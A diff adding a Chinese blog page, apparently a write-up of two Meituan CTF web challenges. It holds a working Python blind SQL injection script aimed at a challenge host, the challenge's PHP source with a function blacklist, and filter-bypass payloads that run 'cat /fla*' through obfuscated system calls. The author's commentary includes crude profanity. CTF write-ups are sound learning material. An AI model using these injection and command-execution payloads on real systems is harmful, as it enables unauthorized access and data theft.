@@ -1,0 +1,214 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>美团CTF两个 - 月出从云</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="web1这题没什么好说的
+sql注入，布尔盲注
+123456789101112131415161718192021222324252627282930313233343536import timei,"> 
+    
+    <link rel="alternative" href="atom.xml" title="月出从云" type="application/atom+xml"> 
+    <link rel="icon" href="/img/1.ico"> 
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">月出从云</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">美团CTF两个</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">美团CTF两个</h1>
+        <div class="stuff">
+            <span>五月 23, 2021</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h1 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h1><p>这题没什么好说的</p>
+<p>sql注入，布尔盲注</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://eci-2ze15odoih1f3qlkwjtb.cloudeci1.ichunqiu.com/index.php&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">goodflag =<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">999</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>, <span class="number">127</span>):</span><br><span class="line">        <span class="keyword">if</span> j == <span class="number">94</span> <span class="keyword">or</span> j == <span class="number">46</span> <span class="keyword">or</span> j == <span class="number">42</span> <span class="keyword">or</span> j == <span class="number">43</span> <span class="keyword">or</span> j == <span class="number">63</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># print(j)</span></span><br><span class="line">        j = <span class="built_in">chr</span>(j).encode()</span><br><span class="line">        j = binascii.hexlify(j)</span><br><span class="line">        j = j.decode(<span class="string">&#x27;utf-8&#x27;</span>)  <span class="comment"># hex2bin</span></span><br><span class="line">        data = &#123;<span class="string">&quot;password&quot;</span>: <span class="string">&quot;||left(password,&#123;&#125;)regexp(binary(0x&#123;&#125;))#&quot;</span>.<span class="built_in">format</span>(i, flag + j)</span><br><span class="line">            , <span class="string">&quot;username&quot;</span>: <span class="string">&quot;\\&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">        res = requests.post(url=url, data=data)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag += j</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            goodflag = binascii.unhexlify(flag).decode()</span><br><span class="line">            print(goodflag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">            <span class="comment"># print(res.text)</span></span><br><span class="line">        <span class="comment"># print(j)</span></span><br><span class="line">        <span class="keyword">if</span> j == <span class="string">&#x27;7d&#x27;</span>:</span><br><span class="line">            exit(<span class="string">&#x27;no&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># database CTF</span></span><br><span class="line"><span class="comment"># user root</span></span><br><span class="line"><span class="comment"># version 5.x?</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>注入得到密码This_1s_thE_Passw0rd，登陆得到flag</p>
+<h1 id="easytricks"><a href="#easytricks" class="headerlink" title="easytricks"></a>easytricks</h1><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>条件竞争</p>
+<p>反序列化写入</p>
+<p>真的脑瘫，我没见过这样子出题的，正常的网站功能用安恒四月赛的web2来出，然后你麻痹的没有用，你这网站功能没用你写你麻痹，你就一个php有用NTM能不能直接给出来啊，脑残？</p>
+<p><img src="image-20210523215019646.png" alt="image-20210523215019646"></p>
+<p>真的搞笑，这其他的PHP全是没有任何一点一一，然后放在admin.rar 里面，比谁目录工具牛逼？真几把死了吗的人才出得来这种题目</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_save_path(<span class="string">&#x27;session&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">preload</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $class;</span><br><span class="line">    <span class="keyword">public</span> $contents;</span><br><span class="line">    <span class="keyword">public</span> $method;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class=<span class="string">&quot;&lt;?php class hacker&#123;public function hack()&#123;echo &#x27;hack the hack!I believe you can!&#x27;;&#125;&#125;\$hack=&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;contents=<span class="string">&quot;new hacker();&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;method=<span class="string">&quot;\$hack-&gt;hack();&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params">$parm</span>)</span>&#123;</span><br><span class="line">        $blacklist=<span class="string">&quot;/flag|pcntl|system|exec|fread|file|fpassthru|popen|proc|ld|putenv|passthru|`|\.|\\\|#|\\$|[0-9]|_|get|~|\\^|eval|assert|open|write|include|require/is&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> preg_match($blacklist,$parm);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;waf(<span class="keyword">$this</span>-&gt;contents)||strlen(<span class="keyword">$this</span>-&gt;contents)&gt;<span class="number">60</span>||preg_match_all(<span class="string">&#x27;/\\(/i&#x27;</span>,<span class="keyword">$this</span>-&gt;contents,$matches)&gt;<span class="number">2</span>||preg_match_all(<span class="string">&#x27;/\\)/i&#x27;</span>,<span class="keyword">$this</span>-&gt;contents,$matches)&gt;<span class="number">2</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="string">&quot;no no no&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(preg_match_all(<span class="string">&#x27;/;/i&#x27;</span>,<span class="keyword">$this</span>-&gt;contents,$matches)&gt;<span class="number">2</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="string">&quot;try hard&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(file_exists(dirname(<span class="keyword">__FILE__</span>).<span class="string">&quot;/hack.php&quot;</span>))&#123;</span><br><span class="line">            unlink(dirname(<span class="keyword">__FILE__</span>).<span class="string">&quot;/hack.php&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        file_put_contents(dirname(<span class="keyword">__FILE__</span>).<span class="string">&quot;/hack.php&quot;</span>,<span class="keyword">$this</span>-&gt;class);</span><br><span class="line">        file_put_contents(dirname(<span class="keyword">__FILE__</span>).<span class="string">&quot;/hack.php&quot;</span>,<span class="keyword">$this</span>-&gt;contents,FILE_APPEND);</span><br><span class="line">        file_put_contents(dirname(<span class="keyword">__FILE__</span>).<span class="string">&quot;/hack.php&quot;</span>,<span class="keyword">$this</span>-&gt;method,FILE_APPEND);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class=<span class="string">&quot;&lt;?php class hacker&#123;public function hack()&#123;echo &#x27;hack the hack!I believe you can!&#x27;;&#125;&#125;\$hack=&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;method=<span class="string">&quot;\$hack-&gt;hack();&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=$_POST[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">unserialize($a);</span><br><span class="line">$preload=<span class="keyword">new</span> preload();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;a href=<span class="string">&quot;./hack.php&quot;</span>&gt;hack.php&lt;/a&gt;</span><br><span class="line">&lt;a href=<span class="string">&quot;./cli.php&quot;</span>&gt;cli.php&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>代码可以审计，发现我们可以控制写入的内容，内容虽然过来的很严格，大概规则如下：</p>
+<ul>
+<li>两个左括号，两个右括号</li>
+<li>一个分号</li>
+<li>flag|pcntl|system|exec|fread|file|fpassthru|popen|proc|ld|putenv|passthru|`|.|\|#|\$|[0-9]|_|get|~|\^|eval|assert|open|write|include|require/is 过滤</li>
+</ul>
+<p>然后依然可以写入- -</p>
+<p><img src="image-20210523215943106.png" alt="image-20210523215943106"></p>
+<p>写入的姿势有两个：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$preload=<span class="keyword">new</span> preload();</span><br><span class="line">$preload-&gt;contents=<span class="string">&quot;strrev(&#x27;metsys&#x27;)(&#x27;cat /fla*&#x27;);&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>或者说：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$preload=<span class="keyword">new</span> preload();</span><br><span class="line">$preload-&gt;contents=<span class="string">&quot;strtr(&#x27;systed&#x27;,&#x27;ed&#x27;,&#x27;em&#x27;)(&#x27;cat /fla*&#x27;);&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                        
+                            <li title='1' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='true'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r='https://github.com/ysllz/ysllz.github.io'
+        data-o='https://github.com/ysllz/ysllz.github.io'
+        data-a='ysllz'
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#web1"><span class="toc-number">1.</span> <span class="toc-text">web1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#easytricks"><span class="toc-number">2.</span> <span class="toc-text">easytricks</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">2.1.</span> <span class="toc-text">知识点</span></a></li></ol></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
